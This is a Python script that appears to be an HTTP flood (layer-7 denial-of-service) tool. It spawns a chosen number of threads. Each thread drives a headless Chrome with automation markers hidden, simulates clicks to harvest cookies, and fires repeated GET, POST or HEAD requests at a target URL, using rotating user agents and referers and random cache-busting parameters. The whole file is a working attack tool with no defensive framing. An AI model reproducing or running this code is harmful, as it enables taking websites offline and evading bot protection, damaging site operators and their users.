import threading
import requests
from queue import Queue
import sys
import time
from itertools import cycle
import random
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def load_user_agents(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return cycle(lines)

def load_referers(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return cycle(lines)

def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def make_request(url, output_queue, request_type, user_agents, referers, driver):
    headers = {
        'User-Agent': next(user_agents),
        'Referer': next(referers),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document'
    }
    mod_url = url + ("&" if url.count("?") > 0 else "?") + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    cookies = {c['name']: c['value'] for c in driver.get_cookies()}
    if request_type == 'get':
        response = requests.get(mod_url, headers=headers, cookies=cookies)
    elif request_type == 'post':
        response = requests.post(mod_url, headers=headers, cookies=cookies)
    elif request_type == 'head':
        response = requests.head(mod_url, headers=headers, cookies=cookies)
    else:
        response = None
    if response:
        output_queue.put(response.text)

def simulate_mouse_movement(driver):
    action = ActionChains(driver)
    elements = driver.find_elements(By.TAG_NAME, "body")
    if elements:
        action.move_to_element_with_offset(elements[0], random.randint(0, 100), random.randint(0, 100))
        action.click()
        action.perform()

def worker(url, output_queue, request_type, duration, user_agents, referers):
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-webgl")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    end_time = time.time() + duration
    while time.time() < end_time:
        simulate_mouse_movement(driver)
        make_request(url, output_queue, request_type, user_agents, referers, driver)
        driver.delete_all_cookies()
        for cookie in driver.get_cookies():
            driver.add_cookie(cookie)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python script.py <url> <duration> <threads> <get/post/head>")
        sys.exit(1)

    url = sys.argv[1]
    duration = float(sys.argv[2])
    thread_count = int(sys.argv[3])
    request_type = sys.argv[4].lower()

    user_agents = load_user_agents("useragents.txt")
    referers = load_referers("referers.txt")
    output_queue = Queue()

    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=worker, args=(url, output_queue, request_type, duration, user_agents, referers), name=f'Thread-{i}')
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    while not output_queue.empty():
        print(output_queue.get())